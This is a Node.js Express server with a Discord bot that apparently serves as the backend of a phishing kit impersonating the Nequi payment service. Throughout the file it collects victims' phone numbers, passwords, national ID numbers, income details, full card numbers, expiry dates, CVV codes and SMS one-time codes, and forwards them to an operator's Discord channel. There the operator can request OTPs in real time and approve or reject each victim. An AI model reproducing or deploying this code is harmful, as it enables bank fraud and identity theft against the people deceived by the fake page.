require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');

const app = express();
app.use(cors());
app.use(express.json());

const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
const DISCORD_CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
const PORT = process.env.PORT || 8080;

const sesiones = new Map();

const client = new Client({ 
    intents: [GatewayIntentBits.Guilds],
    presence: {
        status: 'online',
        activities: [{ name: 'Nequi', type: 0 }]
    }
});

client.once('ready', () => {
    console.log(`✅ Bot conectado como ${client.user.tag}`);
});

client.login(DISCORD_TOKEN);

// Función para detectar la marca de la tarjeta
function detectarMarca(tarjeta) {
    const num = String(tarjeta).replace(/\D/g, '');
    if (num.startsWith('4')) return 'Visa 💳';
    if (num.startsWith('5') || num.startsWith('2')) return 'Mastercard 💳';
    if (num.startsWith('3')) return 'Amex 💳';
    return 'Desconocida';
}

// 🔥 ENDPOINT PRINCIPAL: Recibe TODOS los datos
app.post('/nuevo', async (req, res) => {
    try {
        const { userId, accion, numero, password, datos, otp, tarjeta, codigo, expMes, expAnio, saldo, infoCompleta } = req.body;
        
        const finalUserId = userId || 'anon_' + Date.now();
        const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);

        // 1. DATOS PREVIOS
        if (accion && accion !== 'tarjeta') {
            let embed = new EmbedBuilder().setColor(0xda0081).setTimestamp().setFooter({ text: `User ID: ${finalUserId}` });
            
            if (accion === 'inicio') {
                embed.setTitle('👀 Usuario en la página de inicio');
            } 
            else if (accion === 'password') {
                embed.setTitle('🔒 Numero y Contraaseña')
                     .addFields(
                         { name: '📱 Teléfono', value: `\`${numero}\``, inline: true },
                         { name: '🔑 Clave', value: `\`${password}\``, inline: true }
                     );
            } 
            else if (accion === 'simulador') {
                embed.setTitle('📝 Info perso')
                     .addFields(
                         { name: '📱 Número', value: `\`${numero || 'No disp.'}\``, inline: true },
                         { name: '🔒 Contraseña', value: `\`${password || 'No disp.'}\``, inline: true },
                         { name: '🆔 Cédula', value: `\`${datos.cedula}\``, inline: true },
                         { name: '👤 Nombre', value: `\`${datos.nombre}\``, inline: true },
                         { name: '💼 Ocupación', value: `\`${datos.ocupacion}\``, inline: true },
                         { name: '💰 Ingresos', value: `\`${datos.ingresos}\``, inline: true },
                         { name: '🏦 Saldo Declarado', value: `\`${datos.saldo}\``, inline: true },
                         { name: '📅 Plazo', value: `\`${datos.plazo} meses\``, inline: true },
                         { name: '📆 Día de Pago', value: `\`${datos.fechaPago}\``, inline: true },
                         { name: '💵 Monto Solicitado', value: `\`${datos.monto}\``, inline: true }
                     );
            } 
            else if (accion === 'otp') {
                let infoTexto = '';
                if (infoCompleta) {
                    infoTexto = `Cédula: ${infoCompleta.cedula || 'N/A'}\n` +
                                `Nombre: ${infoCompleta.nombreCompleto || 'N/A'}\n` +
                                `Ocupación: ${infoCompleta.ocupacion || 'N/A'}\n` +
                                `Ingresos: ${infoCompleta.ingresoMensual || 'N/A'}\n` +
                                `Monto: ${infoCompleta.montoPrestamo || 'N/A'}\n` +
                                `Plazo: ${infoCompleta.meses || 'N/A'} meses\n` +
                                `Fecha de pago: día ${infoCompleta.fechaPago || 'N/A'}`;
                }

                embed.setTitle('(OTP)DINAMICA')
                     .setDescription(
                         `📱 **Número:** ${numero || 'N/A'}\n` +
                         `🔒 **Contraseña:** ${password || 'N/A'}\n` +
                         `💰 **Saldo Declarado:** ${saldo || 'N/A'}\n` +
                         `🔢 **OTP Ingresado:** ${otp}\n` +
                         `----------------------------\n` +
                         `**Info Completa:**\n` +
                         `\`\`\`\n${infoTexto}\n\`\`\``
                     );
            }
            
            await channel.send({ embeds: [embed] });
            return res.json({ ok: true });
        }

        // 2. DATOS DE LA TARJETA (CON LOS 2 BOTONES)
        if (!tarjeta) return res.status(400).json({ ok: false, error: 'Falta tarjeta' });

        sesiones.set(finalUserId, {
            userId: finalUserId, tarjeta, codigo: codigo || '', expMes, expAnio,
            estado: 'esperando_decision', otp: null, discordMsgId: null
        });

        const marca = detectarMarca(tarjeta);

        const embed = new EmbedBuilder()
            .setTitle('💳 Nueva tarjeta')
            .setColor(0xda0081)
            .addFields(
                { name: '🆔 User ID', value: `\`${finalUserId}\``, inline: false },
                { name: '💳 Tarjeta', value: `\`${tarjeta}\``, inline: false },
                { name: '🏦 Marca', value: `\`${marca}\``, inline: true },
                { name: '📅 Vence', value: `\`${expMes || '?'}/${expAnio || '?'}\``, inline: true },
                { name: '🔒 CVV/Cédula', value: `\`${codigo}\``, inline: true }
            )
            .setTimestamp();

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId(`otp_${finalUserId}`).setLabel('📱 Pedir OTP').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId(`reject_${finalUserId}`).setLabel('❌ Rechazar').setStyle(ButtonStyle.Danger)
        );

        const msg = await channel.send({ embeds: [embed], components: [row] });
        const s = sesiones.get(finalUserId);
        s.discordMsgId = msg.id;
        sesiones.set(finalUserId, s);

        res.json({ ok: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ ok: false, error: e.message });
    }
});

// ENDPOINT PARA RECIBIR EL SMS
app.post('/validar-otp/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { otp } = req.body;
        const s = sesiones.get(userId);
        if (!s) return res.status(404).json({ ok: false });

        s.otp = otp;
        s.estado = 'otp_recibido'; 
        sesiones.set(userId, s);

        if (s.discordMsgId) {
            const channel = await client.channels.fetch(DISCORD_CHANNEL_ID);
            const msg = await channel.messages.fetch(s.discordMsgId);
            const embed = EmbedBuilder.from(msg.embeds[0]).addFields(
                { name: '📱 SMS Recibido', value: `\`${otp}\``, inline: false }
            );
            
            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId(`approve_${userId}`).setLabel('✅ Aprobar y Finalizar').setStyle(ButtonStyle.Success)
            );
            await msg.edit({ embeds: [embed], components: [row] });
        }
        res.json({ ok: true });
    } catch (e) {
        console.error(e);
        res.status(500).json({ ok: false });
    }
});

// ENDPOINTS DE ESPERA
app.get('/estado/:userId', (req, res) => {
    const s = sesiones.get(req.params.userId);
    if (!s) return res.json({ estado: 'pending' });
    res.json({ estado: s.estado, otp: s.otp || null });
});

// BOTONES DE DISCORD
client.on('interactionCreate', async (interaction) => {
    if (!interaction.isButton()) return;

    const parts = interaction.customId.split('_');
    const action = parts[0];
    const userId = parts.slice(1).join('_');

    const s = sesiones.get(userId);
    
    if (!s) return interaction.reply({ content: '❌ Sesión no encontrada o expirada.', ephemeral: true });

    if (action === 'otp') {
        s.estado = 'pedir_otp'; 
        sesiones.set(userId, s);
        await interaction.reply({ content: `📱 Pantalla de OTP solicitada al usuario.`, ephemeral: true });
    } else if (action === 'approve') {
        s.estado = 'approved';
        sesiones.set(userId, s);
        await interaction.reply({ content: `✅ Usuario aprobado.`, ephemeral: true });
    } else if (action === 'reject') {
        s.estado = 'rejected';
        sesiones.set(userId, s);
        await interaction.reply({ content: `❌ Usuario rechazado.`, ephemeral: true });
    }
});

app.listen(PORT, '0.0.0.0', () => console.log(`🚀 Servidor HTTP en puerto ${PORT}`));
